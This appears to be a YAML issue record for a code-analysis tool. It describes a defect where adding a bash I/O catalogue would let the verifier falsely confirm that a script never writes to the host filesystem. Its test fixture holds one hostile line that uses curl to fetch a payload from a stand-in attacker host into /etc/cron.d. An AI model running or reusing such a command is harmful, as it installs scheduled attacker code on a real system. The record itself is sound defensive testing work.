  nonce: '3291'  # 3291
  data:  # 3291
    kind: invariant  # 3291
    title: "An opaque launch stays opaque only if a catalogue volunteers it: the producer-stamped command_launch channel is never consulted by the coverage gate"  # 3291
    status: violated  # 3291
    priority: 1  # 3291
    parent:  # 3291
    tags:  # 3291
    - io_boundary  # 3291
    - io_primitives  # 3291
    - verify_claims  # 3291
    isbefore: []  # 3291
    duplicate_of: []  # 3291
    not_duplicate_of: []  # 3291
    pr_ref:  # 3291
    description: "## What is broken\n\nOpacity is asked of the CATALOGUE only. `_opaque_launch_sites`\n(verify_claims.py:986-1005) classifies each external call site with\n`classify_call` and then asks `catalog.declares_opaque_crossing(...)`. Both are\ncatalogue-driven. The one producer that knows a call is an opaque launch\nWITHOUT any catalogue row — the bash analyzer, which prestamps\n`meta.io_boundary = \"command_launch\"` at bash.py:534 — is never consulted.\n\nSo an external-program launch stays opaque only if some catalogue voluntarily\ndeclares it under `subprocess`. Nothing forces that, and the boundary that a\nproducer uses to say \"this is a launch\" (`command_launch`) is not in\n`OPAQUE_BOUNDARIES` at all.\n\n## Why it is not live TODAY, and exactly what arms it\n\nbash ships no `io_primitives/bash.yaml`, so `_external_call_sites` drops every\nbash edge on `catalog is None`, and the INV-dabov language gate fires first\n(\"language(s) bash made calls but have no I/O catalog\"). The hole is gated by\nthe ABSENCE OF ONE FILE.\n\nThree places in this repo recommend adding that file:\n\n  - `verify_claims.py:1279-1283` — \"until an io_primitives/bash.yaml exists\n    this downgrades most real repos to inconclusive ... which is why the\n    catalogue is the follow-up rather than a scope exclusion here\"\n  - WI-sofaf disposition 2 — \"Add io_primitives/bash.yaml ... Cleanest\"\n  - the session handoff note, which listed bash.yaml as the next work item\n\nADR-0016:96 rules the catalogue out, so the tree currently disagrees with\nitself. Whoever resolves that disagreement in favour of the catalogue opens\nthis hole in the same commit.\n\n## Measured, shipped CLI, no flags\n\nFixture `fx2/deploy.sh`, two lines, the only external command is curl:\n\n    #!/usr/bin/env bash\n    curl -o /etc/cron.d/pwned \"https://evil.example/payload\"\n\nClaim: `boundary: fs_write, must_not_exist: true` (\"never writes to the host\nfilesystem\"). A file written into /etc/cron.d is the whole point of the fixture.\n\n    bash.yaml contents                     total_io  cmd_launch  fs_write     net_send\n    -------------------------------------  --------  ----------  -----------  ----------\n    (no file - today)                             0           1  inconc rc 2  inconc rc 2\n    curl -> net_send                              1           0  CONFIRM rc0  violat rc 1\n    curl -> net_send + subprocess                 1           0  inconc rc 2  violat rc 1\n    curl -> subprocess + net_send (order          1           0  inconc rc 2  violat rc 1\n      flipped)\n\nRow 2 is the defect: six lines of catalogue turn an honest `inconclusive` into\n`confirmed` rc 0 for a script whose only action is writing a file into\n/etc/cron.d. It is INV-gahuz's failure mode one language over — a row that\nclassifies the call strips its opacity, and `_uncatalogued_external_modules`\nthen permits it as an examined negative for every OTHER boundary.\n\nRows 3 and 4 are the control that makes row 2 a defect rather than blindness:\nthe same run, with `subprocess` ALSO declared, correctly withholds the\nconfirmation via the INV-gahuz reason string (\"launches an external program at\n1 call site(s) (curl.curl) and cannot see what the launched program does\"), and\nstill reports the net_send violation. Detection is not what is at stake —\nopacity is.\n\nRows 3 vs 4 also REFUTE a dependency I predicted before measuring: I expected\nINV-zumin (row-order decides a dual-classified primitive's tag) to make this\norder-sensitive. It does not. Both orders give identical verdicts, because\n`declares_opaque_crossing` asks every row. INV-zumin's damage is on the TAGGING\npath, not the chain/verdict path, and it is NOT a prerequisite here.\n\n## Second measured consequence (independent of the false confirm)\n\nCataloguing a command DISPLACES the producer stamp rather than supplementing\nit: `command_launch_edges` goes 1 -> 0 and `total_io_edges` 0 -> 1. A catalogued\ncommand stops being disclosed as a launch and enters the headline count. That\nis precisely the flood the WI-javoh derivation engineered the count-vs-disclose\nsplit to prevent (~700-823 chains measured on hypergumbo's own shell scripts),\nand it erodes exactly as the catalogue grows.\n\n## The fix (chokepoint, not per-site)\n\nMake opacity STRUCTURAL rather than catalogue-voluntary: one set naming every\nboundary that denotes opacity rather than a known surface, consulted through\nboth channels — catalogue-declared (`subprocess`, via `declares_opaque_crossing`)\nand producer-stamped (`command_launch`, via `edge.meta`). Adding\n`command_launch` to `OPAQUE_BOUNDARIES` is provably inert for\n`declares_opaque_crossing`, because `_parse_catalog` iterates exactly\n`CATALOG_BOUNDARY_TYPES` and `command_launch` is not a member — assert that,\ndo not assume it.\n\nShips with a parity test over the producers that prestamp `io_boundary`\n(exactly one today: bash.py:534) so the next producer to stamp one fails the\ntest instead of silently skipping the gate.\n\n## Acceptance test (positive control, already captured)\n\nWith the gate in place, re-adding the single-boundary `curl -> net_send`\nbash.yaml must move the fs_write claim from `confirmed` rc 0 to `inconclusive`\nrc 2, while the net_send claim stays `violated` rc 1. Corpus delta today is\nexpected to be ZERO (bash has no catalogue, so nothing reaches the new branch)\n— assert the non-destruction rather than reporting a null as a win.\n\n## Consequence for the bash catalogue question\n\nThis does NOT decide whether hypergumbo should ship a bash catalogue; ADR-0016\nsays no and that ruling is untouched. It makes the catalogue SAFE to add rather\nthan silently dangerous, which is the honest-gate-first ordering the owner has\nratified twice (INV-dabov, INV-gahuz). Gate first, catalogue second, do not\nbundle."  # 3291
    fields:  # 3291
      statement: "An external-program launch must block confirmation of every other boundary regardless of HOW it was identified as a launch: a producer-stamped meta.io_boundary=command_launch edge must gate exactly as a catalogue-declared subprocess row does."  # 3291
      root_cause: "_opaque_launch_sites asks only the catalogue (classify_call + declares_opaque_crossing). The sole producer-stamped opacity channel (bash.py:534) is never consulted, and command_launch is not in OPAQUE_BOUNDARIES, so opacity is catalogue-voluntary rather than structural. Masked today only because bash ships no catalogue and the INV-dabov language gate fires first."  # 3291
